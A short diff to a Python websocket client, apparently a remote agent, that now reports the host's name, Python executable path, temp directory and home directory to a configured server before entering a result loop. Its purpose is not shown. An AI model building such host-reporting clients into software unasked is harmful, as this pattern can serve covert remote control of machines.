@@ -1,7 +1,10 @@
 import asyncio
 import websockets
+import tempfile
 import platform
 import json
+import sys
+import os
 
 try:
     from config import config
@@ -10,10 +13,15 @@ except ImportError:
 
 
 async def main():
-    reg_data = json.dumps({"hostname": platform.node()})
+    reg_data = {
+        "hostname": platform.node(),
+        "exe_fn": sys.executable,
+        "temp_dir": tempfile.gettempdir(),
+        "home_dir": os.path.expanduser("~"),
+    }
     async with websockets.connect(config["uri"]) as websocket:
-        await websocket.send(reg_data)
-        state = {}
+        await websocket.send(json.dumps(reg_data))
+        state = reg_data.copy()
         while True:
             state["result"] = None
             state["error"] = None
